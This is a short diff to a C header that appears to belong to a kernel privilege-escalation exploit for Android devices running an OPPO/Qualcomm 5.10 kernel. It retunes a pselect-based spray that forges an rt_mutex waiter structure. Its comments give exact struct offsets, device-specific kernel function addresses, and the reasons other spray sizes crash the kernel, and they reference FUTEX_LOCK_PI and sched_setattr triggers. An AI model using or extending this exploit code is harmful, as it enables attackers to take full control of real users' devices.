@@ -74,15 +74,26 @@ extern int g_core_consumer;
   (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))
 
 #define CONSUMER_MAX_CALLS 1
-/* 128 -> 2 words per set -> core_sys_select copies only bits[0..5] onto the
- * waiter (waiter+0x00..+0x28). waiter->task (+0x30) and waiter->lock (+0x38)
- * fall OUTSIDE the copied window and keep their real kernel-written values.
- * This is mandatory on OPPO/QC 5.10: task_blocks_on_rt_mutex (0x1eaa28),
- * remove_waiter (0x1eb540) and mark_wakeup_next_waiter (0x1ea138) all BUG
- * (brk #0x800) when the tree root's ->lock != lock; with 320 nfds the
- * FD_ZERO'd copy zeroed waiter->lock and the consumer's first FUTEX_LOCK_PI
- * panicked on entry. With 128 nfds the checks see the real pi_mutex. */
-#define PSELECT_ROUTE_NFDS 128
+/* 64 -> 1 word per set -> core_sys_select copies only bits[0..2] onto the
+ * waiter (waiter+0x00..+0x17 = tree_entry). pi_tree_entry (+0x18..+0x2f),
+ * task (+0x30) and lock (+0x38) are NOT copied and keep their real
+ * kernel-written values.
+ *
+ * Why not 128 (2 words/set)? bits[0..5] would cover +0x00..+0x28, which
+ * includes pi_tree_entry. The map sets pi_tree_entry.__rb_parent_color=0
+ * (waiter is root of the owner's pi_waiters). When sched_setattr triggers
+ * rt_mutex_adjust_prio_chain, the chain walk reads the owner's pi_waiters,
+ * finds W with corrupted pi_tree_entry (parent=0, RED), and crashes.
+ *
+ * Why not 320 (5 words/set)? waiter->lock (+0x38) would be zeroed by the
+ * FD_ZERO'd copy. task_blocks_on_rt_mutex (0x1eaa28), remove_waiter
+ * (0x1eb540) and mark_wakeup_next_waiter (0x1ea138) all BUG (brk #0x800)
+ * when the tree root's ->lock != lock.
+ *
+ * 64 nfds: tree_entry fields (+0x00..+0x17) are set by the map:
+ *   tree_pc=1 (BLACK root), tree_right=0, tree_left=0.
+ * Everything beyond +0x17 stays real. */
+#define PSELECT_ROUTE_NFDS 64
 #define PSELECT_CONSUMER_NICE 19
 #define PSELECT_CONSUMER_BURST_CALLS 1
 #define PSELECT_CONSUMER_SETTLE_USEC 250000
